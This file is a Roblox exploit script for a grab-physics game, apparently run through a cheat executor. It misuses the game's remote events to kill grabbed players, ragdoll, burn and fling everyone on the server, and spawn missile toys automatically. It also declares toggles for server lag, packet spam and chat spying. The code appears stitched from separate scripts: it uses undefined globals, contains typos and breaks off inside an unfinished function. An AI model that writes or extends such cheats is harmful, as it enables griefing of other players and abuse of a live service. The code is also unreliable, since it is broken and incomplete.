getgenv().gethui = function() return game.CoreGui end

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")
 
local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local Struggle = CharacterEvents:WaitForChild("Struggle")
local CreateLine = GrabEvents:WaitForChild("CreateGrabLine")
local DestroyLine = GrabEvents:WaitForChild("DestroyGrabLine")
local DestroyToy = MenuToys:WaitForChild("DestroyToy")
 
local localPlayer = Players.LocalPlayer
local playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 
localPlayer.CharacterAdded:Connect(function(character)
    playerCharacter = character
end)
 
local AutoRecoverDroppedPartsCoroutine
local connectionBombReload
local reloadBombCoroutine
local antiExplosionConnection
local poisonAuraCoroutine
local deathAuraCoroutine
local reloadBombCoroutine
local poisonCoroutines = {}
local strengthConnection
local coroutineRunning = false
local autoStruggleCoroutine
local autoDefendCoroutine
local auraCoroutine
local gravityCoroutine
local kickCoroutine
local kickGrabCoroutine
local hellSendGrabCoroutine
local anchoredParts = {}
local anchoredConnections = {}
local compiledGroups = {}
local compileConnections = {}
local compileCoroutine
local fireAllCoroutine
local connections = {}
local renderSteppedConnections = {}
local ragdollAllCoroutine
local crouchJumpCoroutine
local crouchSpeedCoroutine
local anchorGrabCoroutine
local poisonGrabCoroutine
local ufoGrabCoroutine
local burnPart
local fireGrabCoroutine
local noclipGrabCoroutine
local antiKickCoroutine
local kickGrabConnections = {}
local blobmanCoroutine
local lighBitSpeedCoroutine
local lightbitpos = {}
local lightbitparts = {}
local lightbitcon
local lightbitcon2
local lightorbitcon
local bodyPositions = {}
local alignOrientations = {}
 
 
 
local decoyOffset = 15
local stopDistance = 5
local circleRadius = 10
local circleSpeed = 2
local auraToggle = 1
local crouchWalkSpeed = 50
local crouchJumpPower = 50
local kickMode = 1
local auraRadius = 20
local lightbit = 0.3125
local lightbitoffset = 1
local lightbitradius = 20
local usingradius = lightbitradius
 



local followMode = true
local toysFolder = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
local playerList = {}
local selection 
local blobman 
local platforms = {}
local ownedToys = {}
local bombList = {}
_G.ToyToLoad = "BombMissile"
_G.MaxMissiles = 9
_G.BlobmanDelay = 0
 
 
 
local function isDescendantOf(target, other)
    local currentParent = target.Parent
    while currentParent do
        if currentParent == other then
            return true
        end
        currentParent = currentParent.Parent
    end
    return false
end
local function DestroyT(toy)
    local toy = toy or toysFolder:FindFirstChildWhichIsA("Model")
    DestroyToy:FireServer(toy)
end
 
 
local function getDescendantParts(descendantName)
    local parts = {}
    for _, descendant in ipairs(workspace.Map:GetDescendants()) do
        if descendant:IsA("Part") and descendant.Name == descendantName then
            table.insert(parts, descendant)
        end
    end
    return parts
end
 
local poisonHurtParts = getDescendantParts("PoisonHurtPart")
local paintPlayerParts = getDescendantParts("PaintPlayerPart")
 
local function updatePlayerList()
    playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerList, player.Name)
    end
end
 
local function onPlayerAdded(player)
    table.insert(playerList, player.Name)
end
 
local function onPlayerRemoving(player)
    for i, name in ipairs(playerList) do
        if name == player.Name then
            table.remove(playerList, i)
            break
        end
    end
end
 
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)
for i, v in pairs(localPlayer:WaitForChild("PlayerGui"):WaitForChild("MenuGui"):WaitForChild("Menu"):WaitForChild("TabContents"):WaitForChild("Toys"):WaitForChild("Contents"):GetChildren()) do
    if v.Name ~= "UIGridLayout" then
        ownedToys[v.Name] = true
    end
end
 
local function getNearestPlayer()
    local nearestPlayer
    local nearestDistance = math.huge
 
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (playerCharacter.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if distance < nearestDistance then
                nearestDistance = distance
                nearestPlayer = player
            end
        end
    end
 
    return nearestPlayer
end
 
local function cleanupConnections(connectionTable)
    for _, connection in ipairs(connectionTable) do
        connection:Disconnect()
    end
    connectionTable = {}
end
 

 
local function spawnItem(itemName, position, orientation)
    task.spawn(function()
        local cframe = CFrame.new(position)
        local rotation = Vector3.new(0, 90, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end
 
local function arson(part)
    if not toysFolder:FindFirstChild("Campfire") then
        spawnItem("Campfire", Vector3.new(-72.9304581, -5.96906614, -265.543732))
    end
    local campfire = toysFolder:FindFirstChild("Campfire")
    burnPart = campfire:FindFirstChild("FirePlayerPart") or campfire.FirePlayerPart
    burnPart.Size = Vector3.new(7, 7, 7)
    burnPart.Position = part.Position
    task.wait(0.3)
    burnPart.Position = Vector3.new(0, -50, 0)
end
 
local function handleCharacterAdded(player)
    local characterAddedConnection = player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        local fpp = hrp:WaitForChild("FirePlayerPart")
        fpp.Size = Vector3.new(4.5, 5, 4.5)
        fpp.CollisionGroup = "1"
        fpp.CanQuery = true
    end)
    table.insert(kickGrabConnections, characterAddedConnection)
end
 
local function kickGrab()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            if hrp:FindFirstChild("FirePlayerPart") then
                local fpp = hrp.FirePlayerPart
                fpp.Size = Vector3.new(4.5, 5.5, 4.5)
                fpp.CollisionGroup = "1"
                fpp.CanQuery = true
            end
        end
        handleCharacterAdded(player)
    end
 
    local playerAddedConnection = Players.PlayerAdded:Connect(handleCharacterAdded)
    table.insert(kickGrabConnections, playerAddedConnection)
end
 
local function grabHandler(grabType)
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local head = grabbedPart.Parent:FindFirstChild("Head")
                if head then
                    while workspace:FindFirstChild("GrabParts") do
                        local partsTable = grabType == "poison" and poisonHurtParts or paintPlayerParts
                        for _, part in pairs(partsTable) do
                            part.Size = Vector3.new(2, 2, 2)
                            part.Transparency = 1
                            part.Position = head.Position
                        end
                        wait()
                        for _, part in pairs(partsTable) do
                            part.Position = Vector3.new(0, -200, 0)
                        end
                    end
                    for _, part in pairs(partsTable) do
                        part.Position = Vector3.new(0, -200, 0)
                    end
                end
            end
        end)
        wait()
    end
end
 
local function fireGrab()
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local head = grabbedPart.Parent:FindFirstChild("Head")
                if head then
                    arson(head)
                end
            end
        end)
        wait()
    end
end
 
local function noclipGrab()
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local character = grabbedPart.Parent
                if character.HumanoidRootPart then
                    while workspace:FindFirstChild("GrabParts") do
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        wait()
                    end
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = true
                        end
                    end
                end
            end
        end)
        wait()
    end
end
local function spawnItemCf(itemName, cframe)
    task.spawn(function()
        local rotation = Vector3.new(0, 0, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end
 
local function fireAll()
    while true do
        local success, err = pcall(function()
            if toysFolder:FindFirstChild("Campfire") then
                DestroyT(toysFolder:FindFirstChild("Campfire"))
                wait(0.5)
            end
            spawnItemCf("Campfire", playerCharacter.Head.CFrame)
            local campfire = toysFolder:WaitForChild("Campfire")
            local firePlayerPart
            for _, part in pairs(campfire:GetChildren()) do
                if part.Name == "FirePlayerPart" then
                    part.Size = Vector3.new(10, 10, 10)
                    firePlayerPart = part
                    break
                end
            end
            local originalPosition = playerCharacter.Torso.Position
            SetNetworkOwner:FireServer(firePlayerPart, firePlayerPart.CFrame)
            playerCharacter:MoveTo(firePlayerPart.Position)
            wait(0.3)
            playerCharacter:MoveTo(originalPosition)
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 20000
            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
            bodyPosition.Parent = campfire.Main
            while true do
                for _, player in pairs(Players:GetChildren()) do
                    pcall(function()
                        bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
                        if player.Character and player.Character.HumanoidRootPart and player.Character ~= playerCharacter then
                            firePlayerPart.Position = player.Character.HumanoidRootPart.Position or player.Character.Head.Position
                            wait()
                        end
                    end)
                end  
                wait()
            end
        end)
        if not success then
            warn("Error in fireAll: " .. tostring(err))
        end
        wait()
    end
end
 
local function createHighlight(parent)
    local highlight = Instance.new("Highlight")
    highlight.DepthMode = Enum.HighlightDepthMode.Occluded
    highlight.FillTransparency = 1
    highlight.Name = "Highlight"
    highlight.OutlineColor = Color3.new(0, 0, 1)
    highlight.OutlineTransparency = 0.5
    highlight.Parent = parent
    print("created highlight and set on "..parent.Name)
    return highlight
end
 
local function onPartOwnerAdded(descendant, primaryPart)
    if descendant.Name == "PartOwner" and descendant.Value ~= localPlayer.Name then
        local highlight = primaryPart:FindFirstChild("Highlight") or U.GetDescendant(U.FindFirstAncestorOfType(primaryPart, "Model"), "Highlight", "Highlight")
        if highlight then
            if descendant.Value ~= localPlayer.Name then
                highlight.OutlineColor = Color3.new(1, 0, 0)
            else
                highlight.OutlineColor = Color3.new(0, 0, 1)
            end
        end
    end
end
 
local function createBodyMovers(part, position, rotation)
    local bodyPosition = Instance.new("BodyPosition")
    local bodyGyro = Instance.new("BodyGyro")
 
    bodyPosition.P = 15000
    bodyPosition.D = 200
    bodyPosition.MaxForce = Vector3.new(5000000, 5000000, 5000000)
    bodyPosition.Position = position
    bodyPosition.Parent = part
 
    bodyGyro.P = 15000
    bodyGyro.D = 200
    bodyGyro.MaxTorque = Vector3.new(5000000, 5000000, 5000000)
    bodyGyro.CFrame = rotation
    bodyGyro.Parent = part
end
 
local function anchorGrab()
    while true do
        pcall(function()
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then return end
 
            local grabPart = grabParts:FindFirstChild("GrabPart")
            if not grabPart then return end
 
            local weldConstraint = grabPart:FindFirstChild("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then return end
 
            local primaryPart = weldConstraint.Part1.Name == "SoundPart" and weldConstraint.Part1 or weldConstraint.Part1.Parent.SoundPart or weldConstraint.Part1.Parent.PrimaryPart or weldConstraint.Part1
            if not primaryPart then return end
            if primaryPart.Anchored then return end
 
            if isDescendantOf(primaryPart, workspace.Map) then return end
            for _, player in pairs(Players:GetChildren()) do
                if isDescendantOf(primaryPart, player.Character) then return end
            end
            local t = true
            for _, v in pairs(primaryPart:GetDescendants()) do
                if table.find(anchoredParts, v) then
                    t = false
                end
 
            end
            if t and not table.find(anchoredParts, primaryPart) then
                local target 
                if U.FindFirstAncestorOfType(primaryPart, "Model") and U.FindFirstAncestorOfType(primaryPart, "Model") ~= workspace then
                    target = U.FindFirstAncestorOfType(primaryPart, "Model")
                else
                    target = primaryPart
                end
 
                local highlight = createHighlight(target)
                table.insert(anchoredParts, primaryPart)
 
                print(target)
                local connection = target.DescendantAdded:Connect(function(descendant)
                    onPartOwnerAdded(descendant, primaryPart)
                end)
                table.insert(anchoredConnections, connection)
            end
 
 
            if U.FindFirstAncestorOfType(primaryPart, "Model") and U.FindFirstAncestorOfType(primaryPart, "Model") ~= workspace then 
                for _, child in ipairs(U.FindFirstAncestorOfType(primaryPart, "Model"):GetDescendants()) do
                    if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                        child:Destroy()
                    end
                end
            else
                for _, child in ipairs(primaryPart:GetChildren()) do
                    if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                        child:Destroy()
                    end
                end
            end
 
            while workspace:FindFirstChild("GrabParts") do
                wait()
            end
            createBodyMovers(primaryPart, primaryPart.Position, primaryPart.CFrame)
        end)
        wait()
    end
end
local function anchorKickGrab()
    while true do
        pcall(function()
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then return end
 
            local grabPart = grabParts:FindFirstChild("GrabPart")
            if not grabPart then return end
 
            local weldConstraint = grabPart:FindFirstChild("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then return end
 
            local primaryPart = weldConstraint.Part1
            if not primaryPart then return end
 
            if isDescendantOf(primaryPart, workspace.Map) then return end
            if primaryPart.Name ~= "FirePlayerPart" then return end
 
            for _, child in ipairs(primaryPart:GetChildren()) do
                if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                    child:Destroy()
                end
            end
 
            while workspace:FindFirstChild("GrabParts") do
                wait()
            end
            createBodyMovers(primaryPart, primaryPart.Position, primaryPart.CFrame)
        end)
        wait()
    end
end
 
local function cleanupAnchoredParts()
    for _, part in ipairs(anchoredParts) do
        if part then
            if part:FindFirstChild("BodyPosition") then
                part.BodyPosition:Destroy()
            end
            if part:FindFirstChild("BodyGyro") then
                part.BodyGyro:Destroy()
            end
            local highlight = part:FindFirstChild("Highlight") or part.Parent and part.Parent:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
 
    cleanupConnections(anchoredConnections)
    anchoredParts = {}
end
 
local function updateBodyMovers(primaryPart)
    for _, group in ipairs(compiledGroups) do
        if group.primaryPart and group.primaryPart == primaryPart then
            for _, data in ipairs(group.group) do
                local bodyPosition = data.part:FindFirstChild("BodyPosition")
                local bodyGyro = data.part:FindFirstChild("BodyGyro")
                if bodyPosition then
                    bodyPosition.Position = (primaryPart.CFrame * data.offset).Position
                end
                if bodyGyro then
                    bodyGyro.CFrame = primaryPart.CFrame * data.offset
                end
            end
        end
    end
end
 
local function compileGroup()
    if #anchoredParts == 0 then 
        OrionLib:MakeNotification({Name = "Error", Content = "No anchored parts found", Image = "rbxassetid://4483345998", Time = 5})
    else
        OrionLib:MakeNotification({Name = "Success", Content = "Compiled "..#anchoredParts.." Toys together", Image = "rbxassetid://4483345998", Time = 5})
    end
 
    local primaryPart = anchoredParts[1]
    if not primaryPart then return end
 
    local highlight =  primaryPart:FindFirstChild("Highlight") or primaryPart.Parent:FindFirstChild("Highlight")
    if not highlight then
        highlight = createHighlight(primaryPart.Parent:IsA("Model") and primaryPart.Parent or primaryPart)
    end
    highlight.OutlineColor = Color3.new(0, 1, 0) 
 
 
    local group = {}
    for _, part in ipairs(anchoredParts) do
        if part ~= primaryPart then
            local offset = primaryPart.CFrame:toObjectSpace(part.CFrame)
            table.insert(group, {part = part, offset = offset})
        end
    end
    table.insert(compiledGroups, {primaryPart = primaryPart, group = group})
 
    local connection = primaryPart:GetPropertyChangedSignal("CFrame"):Connect(function()
        updateBodyMovers(primaryPart)
    end)
    table.insert(compileConnections, connection)
 
    local renderSteppedConnection = RunService.Heartbeat:Connect(function()
        updateBodyMovers(primaryPart)
    end)
    table.insert(renderSteppedConnections, renderSteppedConnection)
end
 
local function cleanupCompiledGroups()
    for _, groupData in ipairs(compiledGroups) do
        for _, data in ipairs(groupData.group) do
            if data.part then
                if data.part:FindFirstChild("BodyPosition") then
                    data.part.BodyPosition:Destroy()
                end
                if data.part:FindFirstChild("BodyGyro") then
                    data.part.BodyGyro:Destroy()
                end
            end
        end
        if groupData.primaryPart and groupData.primaryPart.Parent then
            local highlight = groupData.primaryPart:FindFirstChild("Highlight") or groupData.primaryPart.Parent:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
 
    cleanupConnections(compileConnections)
    cleanupConnections(renderSteppedConnections)
    compiledGroups = {}
end
 
local function compileCoroutineFunc()
    while true do
        pcall(function()
            for _, groupData in ipairs(compiledGroups) do
                updateBodyMovers(groupData.primaryPart)
            end
        end)
        wait()
    end
end
 
local function unanchorPrimaryPart()
    local primaryPart = anchoredParts[1]
    if not primaryPart then return end
    if primaryPart:FindFirstChild("BodyPosition") then
        primaryPart.BodyPosition:Destroy()
    end
    if primaryPart:FindFirstChild("BodyGyro") then
        primaryPart.BodyGyro:Destroy()
    end
    local highlight = primaryPart.Parent:FindFirstChild("Highlight") or primaryPart:FindFirstChild("Highlight")
    if highlight then
        highlight:Destroy()
    end
end
local function recoverParts()
    while true do
        local success, err = pcall(function()
            local character = localPlayer.Character
            if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                local head = character.Head
                local humanoidRootPart = character.HumanoidRootPart
 
                for _, partModel in pairs(anchoredParts) do
                    coroutine.wrap(function()
                        if partModel then
                            local distance = (partModel.Position - humanoidRootPart.Position).Magnitude
                            if distance <= 30 then
                                local highlight = partModel:FindFirstChild("Highlight") or partModel.Parent:FindFirstChild("Highlight")
                                if highlight and highlight.OutlineColor == Color3.new(1, 0, 0) then
                                    SetNetworkOwner:FireServer(partModel, partModel.CFrame)
                                    if partModel:WaitForChild("PartOwner") and partModel.PartOwner.Value == localPlayer.Name then
                                        highlight.OutlineColor = Color3.new(0, 0, 1)
                                        print("yoyoyo set and r eady")
                                    end
                                end
                            end
                        end
                    end)()
                end
            end
        end)
        wait(0.02)
    end
end
local function ragdollAll()
    while true do
        local success, err = pcall(function()
            if not toysFolder:FindFirstChild("FoodBanana") then
                spawnItem("FoodBanana", Vector3.new(-72.9304581, -5.96906614, -265.543732))
            end
            local banana = toysFolder:WaitForChild("FoodBanana")
            local bananaPeel
            for _, part in pairs(banana:GetChildren()) do
                if part.Name == "BananaPeel" and part:FindFirstChild("TouchInterest") then
                    part.Size = Vector3.new(10, 10, 10)
                    part.Transparency = 1
                    bananaPeel = part
                    break
                end
            end
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 20000
            bodyPosition.Parent = banana.Main
            while true do
                for _, player in pairs(Players:GetChildren()) do
                    pcall(function()
                        if player.Character and player.Character ~= playerCharacter then
                            bananaPeel.Position = player.Character.HumanoidRootPart.Position or player.Character.Head.Position
                            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
                            wait()
                        end
                    end)
                end   
                wait()
            end
        end)
        if not success then
            warn("Error in ragdollAll: " .. tostring(err))
        end
        wait()
    end
end
local function reloadMissile(bool)
    if bool then
        if not ownedToys[_G.ToyToLoad] then
            OrionLib:MakeNotification({
                Name = "Missing toy",
                Content = "You do not own the ".._G.ToyToLoad.." toy.",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            return
        end
 
        if not reloadBombCoroutine then
            reloadBombCoroutine = coroutine.create(function()
                connectionBombReload = toysFolder.ChildAdded:Connect(function(child)
                    if child.Name == _G.ToyToLoad and child:WaitForChild("ThisToysNumber", 1) then
                        if child.ThisToysNumber.Value == (toysFolder.ToyNumber.Value - 1) then
                            local connection2
                            connection2 = toysFolder.ChildRemoved:Connect(function(child2)
                                if child2 == child then
                                    connection2:Disconnect()
                                end
                            end)
 
                            SetNetworkOwner:FireServer(child.Body, child.Body.CFrame)
                            local waiting = child.Body:WaitForChild("PartOwner", 0.5)
                            local connection = child.DescendantAdded:Connect(function(descendant)
                                if descendant.Name == "PartOwner" then
                                    if descendant.Value ~= localPlayer.Name then
                                        DestroyT(child)
                                        connection:Disconnect()
                                    end
                                end
                            end)
                            Debris:AddItem(connectio, 60)
                            if waiting and waiting.Value == localPlayer.Name then
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                    end
                                end
                                child:SetPrimaryPartCFrame(CFrame.new(-72.9304581, -3.96906614, -265.543732))
                                wait(0.2)
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Anchored = true
                                    end
                                end
                                table.insert(bombList, child)
                                child.AncestryChanged:Connect(function()
                                    if not child.Parent then
                                        for i, bomb in ipairs(bombList) do
                                            if bomb == child then
                                                table.remove(bombList, i)
                                                break
                                            end
                                        end
                                    end
                                end)
                                connection2:Disconnect()
                            else
                                DestroyT(child)
                            end
                        end
                    end
                end)
 
                while true do
                    if localPlayer.CanSpawnToy and localPlayer.CanSpawnToy.Value and #bombList < _G.MaxMissiles and playerCharacter:FindFirstChild("Head") then
                        spawnItemCf(_G.ToyToLoad, playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
                    end
                    RunService.Heartbeat:Wait()
                end
            end)
            coroutine.resume(reloadBombCoroutine)
        end
    else
        if reloadBombCoroutine then
            coroutine.close(reloadBombCoroutine)
            reloadBombCoroutine = nil
        end
        if connectionBombReload then
            connectionBombReload:Disconnect()
        end
    end
end


--control thing


-- Variables
local ws = 16
local jp = 50
local infJumpEnabled = false
local teleportKey = Enum.KeyCode.T -- You can change this key if you want

-- Player Reference
local player = game.Players.LocalPlayer
local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")

-- Utility Functions
local function IsInWhitelist(playerName)
return PermanentWhitelist[playerName] or WhitelistedPlayers[playerName]
end

-- Update on character respawn
player.CharacterAdded:Connect(function(char)
    humanoid = char:WaitForChild("Humanoid")
    humanoid.WalkSpeed = ws
    humanoid.JumpPower = jp
end)

--TOGGLES--
flingT = nil
killGrabT = nil
infLineExtendT = nil
antiGrab1T = nil
antiGrab1AnchorT = true
antiBlob1T = nil
antiExplodeT = true
antiLagT = nil
antiStickyT = nil
blobLoopT = nil
walkSpeedT = nil
jumpPowerT = nil
infJumpT = nil
noClipT = nil
floatT = nil
masslessT = nil
blobLoopServerT = nil
blobLoopServerTwoHandT = nil
silentBlobServerT = nil
lagT = nil
pingT = nil
shurikenLagServerT = nil
slideTPT = nil
inspectT = false
inspectInfoT = false
inspectInfoOnT = false
ragdollSpamT = false
permRagdollT = nil
autoGucciT = nil
destroyAutoGucciT = nil
sitJumpT = false
floatUpT = false
floatDownT = false
zoomT = false
spychatT = nil
spySelfT = nil
publicSpyT = nil

--VALUES--
strengthV = 1000
lineDistanceV = 0
increaseLineExtendV = 0
walkSpeedV = 16
jumpPowerV = 24
floatY = -3.1
zoomV = 20
linesV = 400
packetsV = 3000
playersInLoop1V = {}
playersInLoop2V = {}

--STATUSES--
currentHouseS = 0
blobmanInstanceS = nil
currentBlobS = nil
currentInspectS = 0
currentHouseInspectS = 0
currentInspectedAdorneeS = nil
currentInspectedPartS = nil
permRagdollRunningS = false
returnPosS = CFrame.new(0, 0, 0)
mouseTargetS = nil

--DEBS--
infJumpD = false
inspectD = false
slideTPD = false
ragdollSpamD = false
ragdollLoopD = false

--INSTANCES--
highlight = Instance.new("Highlight")
highlight.Name = "highlight"
highlight.Enabled = true
highlight.FillTransparency = 0.9
highlight.OutlineTransparency = 0

billboard = Instance.new("BillboardGui")
billboard.Name = "billboard"
billboard.Size = UDim2.new(0, 100, 0, 150)
billboard.StudsOffset = Vector3.new(0, 1, 0)
billboard.AlwaysOnTop = true

scrollframe = Instance.new("ScrollingFrame")
scrollframe.Name = "scrollframe"
scrollframe.ScrollingEnabled = false
scrollframe.BackgroundTransparency = 0.7

textlabel = Instance.new("TextLabel")
textlabel.Name = "textlabel"
textlabel.TextScaled = true
textlabel.BackgroundTransparency = 1

--GENERALFUNCS--
function updateCurrentBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    for _, blobs in workspace:GetDescendants() do
        if blobs.Name ~= "CreatureBlobman" then continue end
        if not blobs:FindFirstChild("VehicleSeat") then continue end
        if not blobs.VehicleSeat:FindFirstChild("SeatWeld") then continue end
        if blobs.VehicleSeat.SeatWeld.Part1 == hrp then
            currentBlobS = blobs
        end
    end
end

function blobGrabF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function blobDropF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
end

function silentBlobGrabF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector").AttachPlayer,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function updateCurrentHouseF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if char.Parent == workspace then
        currentHouseS = 0
    elseif char.Parent.Name == "PlayersInPlots" then
        for i, e in workspace.Plots:GetChildren() do
            for i, e in e.PlotSign.ThisPlotsOwners:GetChildren() do
                if e.Value == plr.Name then
                    if e.Parent.Parent.Parent.Name == "Plot1" then
						currentHouseS = 1
					elseif e.Parent.Parent.Parent.Name == "Plot2" then
						currentHouseS = 2
					elseif e.Parent.Parent.Parent.Name == "Plot3" then
						currentHouseS = 3
					elseif e.Parent.Parent.Parent.Name == "Plot4" then
						currentHouseS = 4
					elseif e.Parent.Parent.Parent.Name == "Plot5" then
						currentHouseS = 5
					end
                end
            end
        end
	end
end

function mouseTargetInspectF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if mouse.Target then
        if mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
            currentInspectS = 1
            currentHouseInspectS = 0
        elseif mouse.Target.Parent:IsDescendantOf(workspace.Plots) then
                local current = mouse.Target
                repeat
                   current = current.Parent
                until string.match(current.Name, "Plot")
                for i = 1, 5 do
                    if current.Name == "Plot"..i then
                        currentHouseInspectS = i
                    end
                end
                currentInspectS = 2
        elseif mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys") or mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform") then
            currentInspectS = 3
            currentHouseInspectS = 0
        else
            currentInspectS = 4
            currentHouseInspectS = 0
        end
    end
 end

--GRABFUNCS--
function flingF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
            local part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        uis.InputBegan:Connect(function(inp, chat)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                deb:AddItem(velocityObj, 1)
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function killGrabF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(e)
        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name then
            e.GrabPart.WeldConstraint.Part1.Parent:FindFirstChildOfClass("Humanoid").Health = 0
        end
    end)
end

function infLineExtendF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                local grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                local clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

--ANTIFUNCS--
function antiGrab1F()
